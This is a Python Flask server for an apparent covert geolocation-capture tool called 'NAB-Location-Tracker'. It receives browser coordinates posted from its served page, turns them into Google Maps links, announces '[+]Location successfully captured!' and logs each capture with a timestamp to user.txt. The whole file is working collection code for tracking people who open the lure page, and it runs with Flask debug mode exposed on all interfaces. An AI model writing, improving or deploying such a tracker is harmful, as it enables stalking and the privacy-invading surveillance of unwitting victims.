from flask import Flask, render_template, request, jsonify,redirect,url_for
from flask_cors import CORS, cross_origin
import datetime 
    
done=False

app = Flask(__name__)
CORS(app, support_credentials=True)
@app.route('/')
def index():
    print("[+]NAB-Location-Tracker Active")
    return render_template('index.html')


@app.route('/post', methods=['POST',"GET"])
@cross_origin()
def say_name():
    data=request.form.get("txt1")
    try:
        data=data.split(":")
    except:
        return render_template('index.html')
    
    try:
        print("Logging to user.txt for more reference..")
        print("[+]Capture Details.")
        link="https://www.google.com/maps/@"+data[0]+","+data[1]
        print(link)
        print("Accuracy: ",data[2])
        print("[+]Location successfully captured!")
        current_time = datetime.datetime.now() 
        if not done:

            with open('user.txt','a') as f:
                f.write(str('\n')+str("|")+str(current_time)+str("|")+str(link))

        return render_template('index.html')
        
    except:
        print("[-]Error: I guess,Location Access Denied!")
        return render_template("index.html")


if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0",port=80)
